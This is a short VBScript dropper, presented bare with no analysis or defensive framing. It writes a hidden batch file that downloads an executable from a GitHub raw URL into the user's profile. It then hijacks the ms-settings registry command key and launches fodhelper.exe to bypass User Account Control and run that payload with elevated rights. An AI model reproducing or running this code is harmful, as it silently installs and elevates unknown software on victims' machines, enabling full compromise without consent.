Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Path to the batch file in %APPDATA%
batPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\sc.bat"

' Batch script content
batContent = _
"@echo off" & vbCrLf & _
"setlocal" & vbCrLf & _
"set ""EXE_URL=https://github.com/USATIKTOKER/Service/raw/refs/heads/main/code.exe""" & vbCrLf & _
"set ""EXE_PATH=%USERPROFILE%\shish.exe""" & vbCrLf & _
"powershell -command ""Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%' -UseBasicParsing -ErrorAction Stop""" & vbCrLf & _
"if not exist ""%EXE_PATH%"" exit /b 1" & vbCrLf & _
"set ""REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command""" & vbCrLf & _
"reg add ""%REG_KEY%"" /f >nul" & vbCrLf & _
"reg add ""%REG_KEY%"" /v DelegateExecute /t REG_SZ /d """" /f >nul" & vbCrLf & _
"reg add ""%REG_KEY%"" /ve /t REG_SZ /d ""%EXE_PATH%"" /f >nul" & vbCrLf & _
"timeout /t 10 /nobreak >nul" & vbCrLf & _
"start /min """" ""C:\Windows\System32\fodhelper.exe""" & vbCrLf & _
"endlocal"

' Write the batch file
Set file = fso.CreateTextFile(batPath, True)
file.Write batContent
file.Close

' Run the batch file hidden
shell.Run """" & batPath & """", 0, False
